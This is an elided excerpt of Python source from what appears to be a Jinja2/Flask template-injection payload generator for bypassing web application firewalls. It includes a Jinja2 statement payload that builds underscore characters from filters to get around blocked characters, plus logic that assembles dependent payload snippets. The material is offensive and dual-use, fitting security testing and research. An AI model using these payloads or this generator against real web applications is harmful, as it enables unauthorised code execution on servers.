...
context_payloads_stmts: ContextPayloads = {
    "{%set tf=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}"
    + "{%set ul=(()|select|string|list).pop(tf)%}{%set ud=ul~ul%}": {
        "ul": ("_", precedence["literal"]),
        "ud": ("__", precedence["literal"]),
    },
...
class ContextVariableManager:
    ...
    def get_payload(self, used_expressions: ContextExpression) -> List[str]:
        ...
        while to_add_expressions:
            ...
            payload, payload_expressions = next(
                (payload, d)
                for payload, d in self.context_payloads.items()
                if to_add in d
            )
            if payload in self.payload_dependency:
                # 检测依赖的表达式是否都加入了
                dependency_expressions = list(self.payload_dependency[payload].keys())
                assert all(
                    self.is_expression_exists(expr) for expr in dependency_expressions
                )
                if not all(v in added_vars for v in dependency_expressions):
                    to_add_expressions += list(self.payload_dependency[payload])
                    to_add_expressions.append(to_add)
                    continue
            if payload in added_payloads:
                added_vars.update(self.context_payloads[payload].keys())
                continue
            result.append(payload)
            added_payloads.add(payload)
            added_vars.update(payload_expressions.keys())
        return result
...
def prepare_context_vars(waf: WafFunc, options: Options) -> ContextVariableManager:
    ...
    var_expr_info = None
    is_flask = options.environment == TemplateEnvironment.FLASK
    for (
        pattern,
        test_pattern_stmt,
        test_pattern_expr,
        ...
        if requires_flask and not is_flask:
            continue
